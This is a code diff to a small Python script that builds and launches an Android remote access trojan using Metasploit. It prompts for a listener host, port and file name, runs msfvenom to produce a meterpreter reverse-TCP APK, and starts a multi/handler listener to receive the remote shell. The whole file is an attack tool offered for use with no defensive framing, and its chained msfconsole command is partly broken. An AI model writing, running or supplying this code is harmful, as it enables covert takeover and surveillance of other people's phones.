@@ -1,12 +1,33 @@
 import os
+from colorama import Fore,init
+
+init()
+
+
+def Start():
+
+    print(Fore.BLUE+"1 - Create a RAT\n")
+    print(Fore.BLUE+"2 - Start a RAT\n\n")
+    
+    input_options = input(Fore.GREEN+"please enter option: ")
+
+    host_of_RAT = input(Fore.YELLOW+"please enter your host RAT: ")
+    port_of_RAT = input(Fore.YELLOW+"please enter your port RAT: ")
+    name_of_RAT = input(Fore.YELLOW+"please enter your name RAT: ")
+
+    if input_options == "1":
+        
+        os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST={host_of_RAT} LPORT={port_of_RAT} R> /sdcard/{name_of_RAT}.apk")
+        Start()
+
+
+    if input_options == "2":
+        os.system(f"msfconsole && use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost {host_of_RAT} && set lport {port_of_RAT} && exploit")
 
 
 
-input_ = input("please enter option: ")
 
-if input_ == 1:
-    name_of_RAT = input("please enter RAT name: ")
-    os.system(f"cd && cd metasploit-framework && ./msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4040 R> /sdcard/{name_of_RAT}.apk")
 
-if input_ == 2:
-    os.system("msfconsole && use multi/handler && set payload android/meterpreter/reverse_tcp && set lhost 127.0.0.1 && set lport 4040 && exploit")
+
+
+Start()
